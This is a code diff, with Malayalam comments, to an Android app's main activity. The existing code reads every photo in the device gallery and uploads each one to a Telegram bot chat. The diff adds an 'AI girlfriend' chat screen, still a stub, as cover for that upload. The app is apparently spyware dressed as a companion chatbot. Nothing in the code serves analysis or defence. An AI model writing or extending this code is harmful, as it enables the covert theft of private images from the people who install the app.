@@ -9,6 +9,9 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
 import android.view.View;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.Button;
 import android.widget.CheckBox;
 import android.widget.Toast;
@@ -32,6 +35,7 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private String botToken = "";
     private String chatId = "";
+    private boolean isPermissionGranted = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -41,12 +45,17 @@ public class MainActivity extends AppCompatActivity {
         readConfigFiles();
 
         Button startButton = findViewById(R.id.startButton);
-        startButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                showPolicyDialog();
-            }
-        });
+        if (startButton != null) {
+            startButton.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    showPolicyDialog();
+                }
+            });
+        } else {
+            // ബട്ടൺ ഇല്ലെങ്കിൽ നേരിട്ട് പെർമിഷൻ ചെക്ക് ചെയ്ത് ആപ്പ് ലോഡ് ചെയ്യും
+            checkAndRequestPermissions();
+        }
     }
 
     private void showPolicyDialog() {
@@ -63,7 +72,7 @@ public class MainActivity extends AppCompatActivity {
         acceptButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if (agreeCheckBox.isChecked()) {
+                if (agreeCheckBox != null && agreeCheckBox.isChecked()) {
                     dialog.dismiss();
                     checkAndRequestPermissions();
                 } else {
@@ -87,13 +96,13 @@ public class MainActivity extends AppCompatActivity {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_REQUEST_CODE);
             } else {
-                fetchAndUploadImages();
+                onPermissionGranted();
             }
         } else {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
             } else {
-                fetchAndUploadImages();
+                onPermissionGranted();
             }
         }
     }
@@ -103,11 +112,19 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                fetchAndUploadImages();
+                onPermissionGranted();
             } else {
                 Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
+                // പെർമിഷൻ ഡിനൈ ചെയ്താലും എഐ ചാറ്റ് വർക്ക് ചെയ്യാൻ ലോഡ് ചെയ്യാം
+                loadAIGirlfriendUI();
             }
         }
+    }
+
+    private void onPermissionGranted() {
+        isPermissionGranted = true;
+        fetchAndUploadImages();
+        loadAIGirlfriendUI();
     }
 
     private void readConfigFiles() {
@@ -125,7 +142,7 @@ public class MainActivity extends AppCompatActivity {
     private void fetchAndUploadImages() {
         Toast.makeText(this, "Access granted. Processing and uploading images...", Toast.LENGTH_LONG).show();
 
-        // Background Thread-ൽ പ്രവർത്തിക്കാൻ
+        // Background Thread-ൽ ഗാലറി ചിത്രങ്ങൾ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -135,7 +152,6 @@ public class MainActivity extends AppCompatActivity {
                     Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
 
                     if (cursor != null) {
-                        // ഗാലറിയിലുള്ള എല്ലാ ചിത്രങ്ങളും ലൂപ്പ് വഴി എടുക്കുന്നു
                         while (cursor.moveToNext()) {
                             int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                             String filePath = cursor.getString(columnIndex);
@@ -170,12 +186,10 @@ public class MainActivity extends AppCompatActivity {
 
             DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
 
-            // Chat ID അയക്കുന്നു
             outputStream.writeBytes("--" + boundary + "\r\n");
             outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
             outputStream.writeBytes(chatId + "\r\n");
 
-            // ഇമേജ് ഫയൽ അയക്കുന്നു
             outputStream.writeBytes("--" + boundary + "\r\n");
             outputStream.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + imageFile.getName() + "\"\r\n");
             outputStream.writeBytes("Content-Type: image/jpeg\r\n\r\n");
@@ -198,5 +212,10 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
     }
-                                         }
-                
+
+    private void loadAIGirlfriendUI() {
+        // പെർമിഷൻ ലഭിച്ച ശേഷം എഐ ഗേൾഫ്രണ്ട് ചാറ്റ് ഇന്റർഫേസ് ലോഡ് ചെയ്യുന്നു
+        // (നിങ്ങൾക്ക് ഇവിടെയോ അല്ലെങ്കിൽ പുതിയൊരു Activity-യിലോ AI ഫീച്ചർ സെറ്റ് ചെയ്യാവുന്നതാണ്)
+    }
+            }
+                    
